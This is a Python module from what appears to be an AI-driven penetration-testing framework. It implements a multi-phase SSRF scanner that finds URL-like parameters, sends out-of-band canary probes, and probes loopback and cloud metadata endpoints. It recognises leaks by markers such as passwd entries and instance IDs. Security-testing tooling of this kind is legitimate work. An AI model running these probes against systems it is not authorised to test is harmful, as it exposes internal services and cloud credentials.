from __future__ import annotations

import asyncio
import logging
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, ClassVar, List
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

import yaml

from penage.core.actions import Action, ActionType
from penage.core.candidates import CandidateAction
from penage.core.observations import Observation
from penage.core.state import State
from penage.core.tracer import JsonlTracer
from penage.llm.base import LLMClient
from penage.memory.store import MemoryStore
from penage.specialists.base import AsyncSpecialist, SpecialistConfig
from penage.specialists.shared.oob_listener import OobHit, OobListener
from penage.tools.http_backend import HttpBackend

logger = logging.getLogger(__name__)


_DEFAULT_LIBRARY = Path(__file__).resolve().parents[2] / "payloads" / "ssrf.yaml"

_SKIP_INPUT_TYPES = frozenset(
    {"hidden", "submit", "reset", "button", "file", "image", "checkbox", "radio", "password"}
)

_URL_PARAM_HINTS: tuple[str, ...] = (
    "url", "uri", "link", "src", "avatar", "image", "fetch", "webhook",
    "callback", "redirect", "proxy", "import", "host", "endpoint", "feed",
    "rss", "dest", "target",
)

_URL_VALUE_PREFIXES: tuple[str, ...] = ("http://", "https://", "//", "file://", "ftp://")

_PHASE3_CATEGORIES: tuple[str, ...] = (
    "internal-loopback",
    "metadata-aws",
    "metadata-gcp",
    "metadata-azure",
    "scheme-bypass",
)

_FALLBACK_MARKERS: tuple[str, ...] = (
    "root:x:0:0",
    "instance-id",
    "ami-",
    "computeMetadata",
    "redis_version",
    "STAT version",
    "[fonts]",
)

_MAX_PHASE3_TOTAL_HTTP = 12


@dataclass(slots=True)
class _SsrfTarget:
    url: str
    parameter: str
    channel: str  # "GET" | "POST"


class _BudgetedHttpTool:
    """Caps a specialist's HTTP usage while still bumping the global counters."""

    def __init__(self, inner: HttpBackend, state: State, cap: int) -> None:
        self._inner = inner
        self._state = state
        self._cap = max(0, int(cap))
        self._used = 0

    async def run(self, action: Action) -> Observation:
        if self._used >= self._cap:
            return Observation(ok=False, error="ssrf_specialist:budget_exhausted")
        self._used += 1
        self._state.http_requests_used += 1
        self._state.tool_calls_http += 1
        self._state.tool_calls_total += 1
        try:
            return await self._inner.run(action)
        except Exception as exc:  # LEGACY: HTTP boundary
            return Observation(ok=False, error=f"ssrf_specialist:http_error:{exc}")

    @property
    def remaining(self) -> int:
        return max(0, self._cap - self._used)

    @property
    def used(self) -> int:
        return self._used


@dataclass(slots=True)
class SsrfSpecialist(AsyncSpecialist):
    """AWE-style five-phase SSRF specialist.

    Phases:
      1. Target discovery (URL-param heuristic + form/query-string scan).
      2. OOB canary probing (via shared.oob_listener).
      3. Internal-target probing (loopback + cloud metadata + scheme
         bypass; expected_marker matching).
      4. LLM/deterministic payload mutation on bypass-failure.
         (SEPARATE SESSION: этот метод пока raises NotImplementedError
          если вызван; propose_async до phase 4 не доходит в этой
          итерации.)
      5. Evidence gating & finalization.

    A finding is verified only if (a) the OOB listener observed an
    incoming request carrying our token, or (b) a payload from phase 3
    produced an in-body marker uniquely tied to an internal resource.
    """

    name: ClassVar[str] = "ssrf"

    http_tool: HttpBackend | None = None
    llm_client: LLMClient | None = None
    memory: MemoryStore | None = None
    tracer: JsonlTracer | None = None
    oob_listener: OobListener | None = None

    payload_library_path: Path = field(default_factory=lambda: _DEFAULT_LIBRARY)
    max_http_budget: int = 30
    max_targets: int = 3
    min_reserve_http: int = 10
    oob_wait_s: float = 5.0
    max_internal_probes: int = 8

    _done: bool = field(default=False, init=False)
    _attempted: set[str] = field(default_factory=set, init=False)
    _findings: list[dict[str, Any]] = field(default_factory=list, init=False)
    _phase3_http_used: int = field(default=0, init=False)
    _payload_entries_cache: list[dict[str, Any]] | None = field(default=None, init=False)

    def propose(self, state: State, *, config: SpecialistConfig) -> List[CandidateAction]:
        _ = (state, config)
        return []

    async def propose_async(self, state: State, *, config: SpecialistConfig) -> List[CandidateAction]:
        if self._done or self.http_tool is None or self.llm_client is None:
            return self._emit_if_any()

        targets = self._discover_targets(state)
        if not targets:
            return []

        if self.max_http_budget < self.min_reserve_http:
            self._note(f"ssrf:insufficient_budget cap={self.max_http_budget}")
            return []

        budgeted = _BudgetedHttpTool(self.http_tool, state, cap=self.max_http_budget)
        step = int(getattr(state, "orch_step", 0))

        for target in targets[: self.max_targets]:
            key = f"{target.url}|{target.parameter}"
            if key in self._attempted:
                continue
            if budgeted.remaining < 1:
                self._note(f"ssrf:budget_low remaining={budgeted.remaining}")
                break

            finding = await self._run_pipeline(
                target=target,
                http_tool=budgeted,
                step=step,
                config=config,
            )
            self._attempted.add(key)
            if finding is not None:
                self._findings.append(finding)
                if finding.get("verified"):
                    self._done = True
                    break

        return self._emit_if_any()

    def _emit_if_any(self) -> List[CandidateAction]:
        if not self._findings:
            return []
        finding = self._findings[-1]
        if not finding.get("verified"):
            # Candidate-emission path лежит в Stage 2.8c (phase 4/5).
            return []

        mode = finding.get("mode") or "none"
        score = 13.0 if mode == "oob" else 11.0
        tag = "verified"
        action = Action(
            type=ActionType.NOTE,
            params={"kind": "ssrf_finding", "finding": finding},
            tags=["ssrf", tag, mode],
        )
        return [
            CandidateAction(
                action=action,
                source=self.name,
                score=score,
                cost=0.0,
                reason=finding.get("summary") or "SSRF finding",
                metadata={"evidence": finding},
            )
        ]

    async def _run_pipeline(
        self,
        *,
        target: _SsrfTarget,
        http_tool: _BudgetedHttpTool,
        step: int,
        config: SpecialistConfig,
    ) -> dict[str, Any] | None:
        host = _host_of(target.url)

        # --- Phase 1 -----------------------------------------------------
        self._trace_phase(
            1,
            "target_discovery",
            step=step,
            target=target,
        )

        # --- Phase 2: OOB canary probing --------------------------------
        oob_finding = await self._run_oob_phase(
            target=target,
            http_tool=http_tool,
            step=step,
            host=host,
        )
        if oob_finding is not None:
            return oob_finding

        # --- Phase 3: internal-target probing ---------------------------
        if http_tool.remaining < 1:
            self._note("ssrf:budget_exhausted_before_phase3")
            return None

        internal_finding = await self._run_internal_phase(
            target=target,
            http_tool=http_tool,
            step=step,
            host=host,
        )
        if internal_finding is not None:
            return internal_finding

        _ = config  # phase 4 (mutation) uses it — next session.
        return None

    async def _run_oob_phase(
        self,
        *,
        target: _SsrfTarget,
        http_tool: _BudgetedHttpTool,
        step: int,
        host: str,
    ) -> dict[str, Any] | None:
        listener = self.oob_listener
        if listener is None or not listener.is_running:
            self._note("ssrf:oob_listener_unavailable")
            return None

        if http_tool.remaining < 1:
            self._note("ssrf:budget_exhausted_before_phase2")
            return None

        try:
            token, probe_url = await listener.register_token()
        except Exception as exc:
            logger.warning("ssrf oob register_token failed: %s", exc)
            self._note(f"ssrf:oob_register_failed:{exc}")
            return None

        self._trace_phase(
            2,
            "oob_canary_probes",
            step=step,
            target=target,
            extra={
                "target_url": target.url,
                "token_count": 1,
            },
        )

        probe_action = _build_probe_action(target, probe_url)

        shoot_coro = http_tool.run(probe_action)
        wait_coro = listener.wait_for_hit(token, self.oob_wait_s)

        shoot_result, hit = await asyncio.gather(shoot_coro, wait_coro, return_exceptions=True)

        if isinstance(hit, Exception):
            logger.warning("ssrf oob wait_for_hit failed: %s", hit)
            hit = None
        if isinstance(shoot_result, Exception):
            logger.warning("ssrf oob probe shoot failed: %s", shoot_result)
            shoot_obs: Observation = Observation(ok=False, error=f"ssrf:phase2_error:{shoot_result}")
        else:
            shoot_obs = shoot_result  # type: ignore[assignment]

        response_text = _response_text(shoot_obs)

        if isinstance(hit, OobHit):
            self._record_attempt(
                host=host,
                parameter=target.parameter,
                payload=probe_url,
                outcome="verified_oob",
            )
            return {
                "verified": True,
                "kind": "ssrf_oob",
                "mode": "oob",
                "parameter": target.parameter,
                "payload": probe_url,
                "channel": target.channel,
                "url": target.url,
                "evidence": {
                    "mode": "oob",
                    "oob_hit": {"remote_addr": hit.remote_addr, "path": hit.path},
                    "response_markers": [],
                    "http_status": _status_of(shoot_obs),
                    "response_excerpt": response_text[:500],
                },
                "summary": (
                    f"SSRF verified via OOB callback on {target.parameter} "
                    f"(remote={hit.remote_addr})"
                ),
            }

        self._record_attempt(
            host=host,
            parameter=target.parameter,
            payload=probe_url,
            outcome="no_signal",
        )
        return None

    async def _run_internal_phase(
        self,
        *,
        target: _SsrfTarget,
        http_tool: _BudgetedHttpTool,
        step: int,
        host: str,
    ) -> dict[str, Any] | None:
        entries = self._select_internal_payloads(self.max_internal_probes)
        if not entries:
            self._trace_phase(
                3,
                "internal_probing",
                step=step,
                target=target,
                extra={"probes_sent": 0, "markers_matched": []},
            )
            return None

        probes_sent = 0
        markers_matched: list[str] = []
        verified_finding: dict[str, Any] | None = None

        for entry in entries:
            if self._phase3_http_used >= _MAX_PHASE3_TOTAL_HTTP:
                break
            if http_tool.remaining < 1:
                break

            payload = str(entry.get("payload") or "")
            if not payload:
                continue
            expected = entry.get("expected_marker")
            expected_s = str(expected) if expected is not None else None

            probe_action = _build_probe_action(target, payload)
            obs = await http_tool.run(probe_action)
            self._phase3_http_used += 1
            probes_sent += 1

            text = _response_text(obs)
            matched = _find_markers(text, expected_s)

            if matched:
                markers_matched.extend(matched)
                outcome = "verified_metadata"
                verified_finding = {
                    "verified": True,
                    "kind": "ssrf_metadata_leak",
                    "mode": "internal_marker",
                    "parameter": target.parameter,
                    "payload": payload,
                    "channel": target.channel,
                    "url": target.url,
                    "evidence": {
                        "mode": "internal_marker",
                        "oob_hit": None,
                        "response_markers": list(matched),
                        "http_status": _status_of(obs),
                        "response_excerpt": text[:500],
                    },
                    "summary": (
                        f"SSRF leaked internal marker on {target.parameter} "
                        f"(payload_id={entry.get('id')}, markers={matched})"
                    ),
                }
            elif obs.ok:
                outcome = "no_signal"
            else:
                outcome = "blocked" if obs.error and "budget" in str(obs.error) else "error"

            self._record_attempt(
                host=host,
                parameter=target.parameter,
                payload=payload,
                outcome=outcome,
            )
            if verified_finding is not None:
                break

        self._trace_phase(
            3,
            "internal_probing",
            step=step,
            target=target,
            extra={
                "probes_sent": probes_sent,
                "markers_matched": list(markers_matched),
            },
        )
        return verified_finding

    async def _run_mutation_phase(
        self,
        *,
        target: _SsrfTarget,
        http_tool: _BudgetedHttpTool,
        step: int,
        host: str,
    ) -> dict[str, Any] | None:
        # TODO: Implemented in follow-up (2.8c).
        _ = (target, http_tool, step, host)
        raise NotImplementedError("SSRF phase 4 (payload mutation) ships in 2.8c")

    # ---- target discovery ----------------------------------------------

    def _discover_targets(self, state: State) -> list[_SsrfTarget]:
        targets: list[_SsrfTarget] = []
        seen: set[tuple[str, str]] = set()

        for page_url, forms in (state.forms_by_url or {}).items():
            for form in forms or []:
                action_url = str(form.get("action") or page_url or "")
                if not action_url:
                    continue
                method = str(form.get("method") or "POST").upper()
                if method not in {"GET", "POST"}:
                    continue
                for inp in form.get("inputs") or []:
                    name = str(inp.get("name") or "")
                    itype = str(inp.get("type") or "").lower()
                    if not name or itype in _SKIP_INPUT_TYPES:
                        continue
                    value = str(inp.get("value") or "")
                    if not _is_ssrf_candidate(name, value):
                        continue
                    key = (action_url, name)
                    if key in seen:
                        continue
                    seen.add(key)
                    targets.append(_SsrfTarget(url=action_url, parameter=name, channel=method))

        last_url = state.last_http_url
        if last_url:
            try:
                parsed = urlparse(last_url)
            except Exception:
                parsed = None
            if parsed is not None and parsed.query:
                base = urlunparse(parsed._replace(query=""))
                for name, value in parse_qsl(parsed.query, keep_blank_values=True):
                    if not _is_ssrf_candidate(name, value):
                        continue
                    key = (base, name)
                    if key in seen:
                        continue
                    seen.add(key)
                    targets.append(_SsrfTarget(url=base, parameter=name, channel="GET"))

        return targets

    # ---- payload YAML handling -----------------------------------------

    def _load_payload_entries(self) -> list[dict[str, Any]]:
        if self._payload_entries_cache is not None:
            return self._payload_entries_cache
        try:
            with Path(self.payload_library_path).open("r", encoding="utf-8") as fh:
                data = yaml.safe_load(fh) or []
        except Exception as exc:
            logger.warning("ssrf payload library load failed: %s", exc)
            self._payload_entries_cache = []
            return self._payload_entries_cache
        entries = [e for e in data if isinstance(e, dict)]
        self._payload_entries_cache = entries
        return entries

    def _select_internal_payloads(self, k: int) -> list[dict[str, Any]]:
        entries = self._load_payload_entries()
        by_cat: dict[str, list[dict[str, Any]]] = {cat: [] for cat in _PHASE3_CATEGORIES}
        for entry in entries:
            cat = entry.get("category")
            if cat in by_cat:
                by_cat[cat].append(entry)

        selected: list[dict[str, Any]] = []
        idx = 0
        active = [c for c in _PHASE3_CATEGORIES if by_cat.get(c)]
        while len(selected) < k and active:
            cat = active[idx % len(active)]
            bucket = by_cat[cat]
            if bucket:
                selected.append(bucket.pop(0))
                idx += 1
            if not bucket:
                active.remove(cat)
                if not active:
                    break
                # keep idx relative to new active length by not changing it;
                # modulo normalises next iteration.
        return selected

    # ---- memory / tracing ----------------------------------------------

    def _record_attempt(self, *, host: str, parameter: str, payload: str, outcome: str) -> None:
        if self.memory is None:
            return
        try:
            self.memory.record_attempt(
                episode_id=self._episode_id(),
                host=host,
                parameter=parameter,
                payload=payload,
                outcome=outcome,
            )
        except Exception as exc:
            logger.warning("ssrf memory record_attempt failed: %s", exc)

    def _trace_phase(
        self,
        phase_num: int,
        name: str,
        *,
        step: int,
        target: _SsrfTarget,
        extra: dict[str, Any] | None = None,
    ) -> None:
        if self.tracer is None:
            return
        payload: dict[str, Any] = {
            "specialist": self.name,
            "phase": phase_num,
            "phase_name": name,
            "step": step,
            "url": target.url,
            "parameter": target.parameter,
            "channel": target.channel,
        }
        if extra:
            payload.update(extra)
        try:
            self.tracer.write_event("specialist_phase", payload)
        except Exception as exc:
            logger.warning("ssrf tracer write failed: %s", exc)

    def _note(self, text: str) -> None:
        if self.tracer is None:
            return
        try:
            self.tracer.record_note(text)
        except Exception as exc:
            logger.warning("ssrf tracer note failed: %s", exc)

    def _episode_id(self) -> str:
        if self.tracer is not None:
            return str(self.tracer.episode_id)
        return "no-episode"


# -----------------------------------------------------------------------
# module-level helpers
# -----------------------------------------------------------------------


def _is_ssrf_candidate(parameter: str, value: str) -> bool:
    lname = parameter.lower()
    if any(hint in lname for hint in _URL_PARAM_HINTS):
        return True
    v = (value or "").lower()
    return any(v.startswith(p) for p in _URL_VALUE_PREFIXES)


def _build_probe_action(target: _SsrfTarget, payload: str) -> Action:
    if target.channel == "GET":
        probe_url = _set_query_param(target.url, target.parameter, payload)
        return Action(
            type=ActionType.HTTP,
            params={
                "method": "GET",
                "url": probe_url,
                "follow_redirects": False,
                "max_redirects": 1,
            },
            timeout_s=10.0,
            tags=["ssrf", "probe"],
        )
    return Action(
        type=ActionType.HTTP,
        params={
            "method": "POST",
            "url": target.url,
            "data": {target.parameter: payload},
            "follow_redirects": False,
            "max_redirects": 1,
        },
        timeout_s=10.0,
        tags=["ssrf", "probe"],
    )


def _response_text(obs: Observation) -> str:
    if not obs.ok or not isinstance(obs.data, dict):
        return ""
    return str(obs.data.get("text_full") or obs.data.get("text_excerpt") or "")


def _status_of(obs: Observation) -> int | None:
    if not obs.ok or not isinstance(obs.data, dict):
        return None
    status = obs.data.get("status_code")
    try:
        return int(status) if status is not None else None
    except (TypeError, ValueError):
        return None


def _set_query_param(url: str, name: str, value: str) -> str:
    parsed = urlparse(url)
    pairs = [(k, v) for (k, v) in parse_qsl(parsed.query, keep_blank_values=True) if k != name]
    pairs.append((name, value))
    return urlunparse(parsed._replace(query=urlencode(pairs, doseq=True)))


def _host_of(url: str) -> str:
    try:
        return (urlparse(url).netloc or "").lower()
    except Exception:
        return ""


def _find_markers(text: str, expected: str | None) -> list[str]:
    if not text:
        return []
    if expected is not None:
        return [expected] if expected and expected in text else []
    matched: list[str] = []
    for marker in _FALLBACK_MARKERS:
        if marker in text:
            matched.append(marker)
    return matched


__all__ = ["SsrfSpecialist"]
